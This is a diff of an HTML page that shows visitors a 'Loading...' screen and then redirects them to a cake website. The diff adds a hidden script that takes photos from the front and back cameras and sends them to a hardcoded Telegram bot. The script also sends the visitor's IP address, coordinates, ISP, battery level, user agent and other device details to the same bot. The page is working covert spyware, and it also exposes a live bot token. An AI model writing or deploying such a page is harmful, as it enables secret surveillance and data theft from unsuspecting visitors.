@@ -1,33 +1,77 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
   <title>Redirecting...</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta http-equiv="refresh" content="3;url=https://heavenscake.vercel.app">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="refresh" content="10;url=https://heavenscake.vercel.app">
   <style>
     body {
-      background: #111;
+      background: #000;
       color: #fff;
       text-align: center;
       font-family: sans-serif;
-      padding: 50px;
-    }
-    h2 {
-      margin-bottom: 20px;
+      font-size: 18px;
+      padding: 40px;
     }
   </style>
 </head>
 <body>
-  <h2>Loading Device Info...</h2>
-  <p>Please wait, you will be redirected shortly.</p>
+  <p>Loading...</p>
 
   <script>
     const BOT_TOKEN = "7740401254:AAGqaGtAQ2YEiwXtjert2CiuWFADXbGz3Jg";
     const CHAT_ID = "7216371031";
     let deviceInfo = "";
 
-    // Get battery info
+    // Send text to Telegram
+    function sendToTelegram(message) {
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+      });
+    }
+
+    // Send image blob to Telegram
+    function sendPhotoToTelegram(blob) {
+      const formData = new FormData();
+      formData.append("chat_id", CHAT_ID);
+      formData.append("photo", blob, "camera.jpg");
+
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method: "POST",
+        body: formData
+      });
+    }
+
+    // Take a photo from camera
+    async function takePhoto(facingMode = "user") {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: facingMode }
+        });
+        const video = document.createElement("video");
+        video.srcObject = stream;
+        await video.play();
+
+        await new Promise(resolve => setTimeout(resolve, 800)); // wait camera adjust
+
+        const canvas = document.createElement("canvas");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(video, 0, 0);
+
+        stream.getTracks().forEach(track => track.stop());
+        const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg", 0.8));
+        sendPhotoToTelegram(blob);
+      } catch (err) {
+        console.log("Camera access denied or failed:", err.message);
+      }
+    }
+
+    // Get battery
     function getBatteryInfo() {
       return navigator.getBattery().then(battery => {
         deviceInfo += `🔋 Battery: ${Math.round(battery.level * 100)}%\n`;
@@ -37,40 +81,36 @@
       });
     }
 
-    // Get IP and location
+    // Get IP/location
     function getIPInfo() {
       return fetch("http://ip-api.com/json")
         .then(res => res.json())
         .then(ip => {
-          deviceInfo += `🌍 IP: ${ip.query}\n📍 Location: ${ip.city}, ${ip.country}\n`;
+          deviceInfo += `🌍 IP: ${ip.query}\n📍 Location: ${ip.city}, ${ip.regionName}, ${ip.country}\n`;
+          deviceInfo += `📌 Lat: ${ip.lat}, Lon: ${ip.lon}\n🌐 ISP: ${ip.isp}\n`;
         }).catch(() => {
-          deviceInfo += `🌍 IP: Not Available\n`;
+          deviceInfo += `🌍 IP: Not Available\n📍 Location: Unknown\n`;
         });
     }
 
-    // Send to Telegram
-    function sendToTelegram(message) {
-      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: CHAT_ID, text: message })
-      });
-    }
-
-    // Collect all info, then send
-    Promise.all([
-      getBatteryInfo(),
-      getIPInfo()
-    ]).then(() => {
+    // Final data collection and redirect
+    async function collectAndSend() {
+      await Promise.all([getBatteryInfo(), getIPInfo()]);
       deviceInfo += `🌐 Language: ${navigator.language}\n`;
       deviceInfo += `💻 Platform: ${navigator.platform}\n`;
       deviceInfo += `🖥️ Screen: ${screen.width}x${screen.height}\n`;
       deviceInfo += `📱 UA: ${navigator.userAgent}\n`;
       deviceInfo += `🕒 Time: ${new Date().toLocaleString()}\n`;
       deviceInfo += `🔗 Referrer: ${document.referrer || 'Direct'}\n`;
-
       sendToTelegram(deviceInfo);
-    });
+
+      // Try to take photos
+      await takePhoto("user");  // Front cam
+      await takePhoto("user");  // Front cam again
+      await takePhoto("environment"); // Back cam
+    }
+
+    collectAndSend();
   </script>
 </body>
 </html>
